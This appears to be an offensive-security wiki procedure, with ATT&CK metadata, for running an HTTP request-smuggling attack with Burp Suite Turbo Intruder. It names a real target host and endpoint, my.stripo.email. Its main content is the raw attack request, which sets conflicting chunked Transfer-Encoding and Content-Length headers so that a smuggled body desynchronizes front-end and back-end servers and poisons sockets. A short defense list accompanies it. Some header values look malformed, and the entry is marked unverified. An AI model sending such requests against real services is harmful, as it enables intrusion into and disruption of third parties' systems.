---
tags:
  - http-request-smuggling
  - request-desynchronization
type: procedure
tools:
  - '[[tools/Burp-Suite-Turbo-Intruder]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/craft-http-smuggling-request]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: f89c24be-9eff-4fa3-9c8a-94a89bdd55b8
created_at: '2025-12-13T09:01:17.629Z'
updated_at: '2025-12-13T09:01:17.629Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Execute Turbo Intruder for Request Smuggling

## Summary

This procedure uses Burp Suite Turbo Intruder to send a crafted POST request that exploits HTTP Request Smuggling by causing desynchronization in request length interpretation between servers.

## Description

The crafted request includes conflicting headers (Transfer-Encoding: chunked and Content-Length) to trick the backend into processing requests differently, leading to socket poisoning. This is applied to the endpoint /?aeRg=2056729135 on my.stripo.email.

## Requirements

1. Burp Suite with Turbo Intruder extension
2. Target endpoint accessible
3. Crafted request template

## Defense

Defensive measures and detection strategies:

- Implement strict header validation to reject ambiguous requests
- Log and alert on chunked encoding mismatches

## Objectives

1. Send desynchronizing request
2. Achieve request smuggling
3. Poison backend sockets

## Instructions

### Step 1: Prepare Crafted Request in Turbo Intruder

**Context**: Load the base request into Turbo Intruder.

Open Turbo Intruder in Burp Suite and paste the base POST request to the target endpoint.

> This sets up the request for modifications.

### Step 2: Send Crafted Smuggling Request

**Context**: Modify and send the request to exploit the vulnerability.

Execute [[commands/craft-http-smuggling-request]]:

```http
POST /?aeRg=2056729135 HTTP/1.1
Host: my.stripo.email
Transfer-Encoding: chunked
Content-Length: keep-alive

f
ubvhq=x&e3t5b=x
0
```

> Explanation: The chunked body causes length desynchronization, poisoning the socket.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/craft-http-smuggling-request]]

## Tools Used

- [[tools/Burp-Suite-Turbo-Intruder]]

## Tags

- [[http-request-smuggling]]
- [[request-desynchronization]]
